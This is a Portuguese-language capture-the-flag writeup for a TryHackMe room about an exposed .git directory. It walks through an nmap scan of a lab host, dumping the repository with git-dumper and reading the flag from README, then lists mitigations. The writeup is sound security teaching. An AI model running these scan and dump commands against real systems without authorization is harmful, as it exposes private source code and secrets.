# Writeup: TryHackMe — Hacker Holidays (Room 404)

**Plataforma:** [TryHackMe](https://tryhackme.com/)  
**Categoria:** Web  
**Dificuldade:** Muito Fácil (Very Easy)  
**URL da Sala:** `https://tryhackme.com/room/hh-room404-804573bf`  

---

## 📌 Resumo

Esta sala aborda o risco de expor diretórios de controle de versão (`.git`) em ambientes de produção. A partir de uma varredura de portas com `nmap`, identificou-se um repositório `.git` exposto na porta `8080`. Utilizando a ferramenta `git-dumper`, foi feito o download de todo o código-fonte da aplicação. Ao analisar o diretório baixado, a flag foi encontrada diretamente no arquivo `README`.

---

## 🛠️ Ferramentas Utilizadas

* **Nmap:** Varredura de portas e enumeração de serviços
* **git-dumper:** Extração de código-fonte de repositórios Git expostos
* **Comandos Linux:** `cd`, `ls`, `cat`

---

## 🔍 Passo 1: Reconhecimento e Enumeração

Iniciou-se o processo realizando uma varredura de portas no IP da máquina alvo utilizando o `nmap` com os scripts padrões (`-sC`) e detecção de versão (`-A`):

```bash
nmap -sC -A 10.67.191.83
```

### Saída do Nmap:
```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.12.3
| http-git: 
|   10.67.191.83:8080/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial Byte Lotus guest platform 
|_http-title: Byte Lotus — Stay Noticed
```

### Achados Principais:
1. **Porta 22/TCP:** Serviço SSH ativo.
2. **Porta 8080/TCP:** Aplicação web rodando Werkzeug/Python (**Byte Lotus**).
3. **Diretório Exposto:** O Nmap identificou a presença do diretório `.git` acessível publicamente em `http://10.67.191.83:8080/.git/`.

---

## 💥 Passo 2: Exploração (Dump do Código-Fonte)

Como a pasta `.git` estava acessível, utilizou-se o `git-dumper` para baixar o repositório completo e reconstruir os arquivos locais da aplicação:

```bash
# Baixar todo o conteúdo do repositório .git exposto
git-dumper http://10.67.191.83:8080/.git/ pasta_projeto
```

Após a conclusão do download, acessou-se a pasta criada:

```bash
cd pasta_projeto
ls -la
```

---

## 🚩 Passo 3: Captura da Flag

Navegando pelos arquivos baixados do repositório, identificou-se a presença do arquivo `README`.

Para visualizar o conteúdo do arquivo e obter a flag:

```bash
cat README
```

---

## 🛡️ Medidas de Correção (Mitigação)

1. **Restringir Acesso a Metadados:** Nunca implantar pastas de controle de versão (`.git`, `.svn`) em servidores web de produção.
2. **Configuração do Servidor Web:** Adicionar regras no servidor web (Nginx, Apache ou Reverse Proxy) para bloquear explicitamente qualquer requisição direcionada a pastas ocultas, como `/\.git/`.
3. **Pipeline de CI/CD:** Garantir que o processo de deploy envie apenas os arquivos compilados/necessários para a aplicação rodar, excluindo o repositório de código fonte.
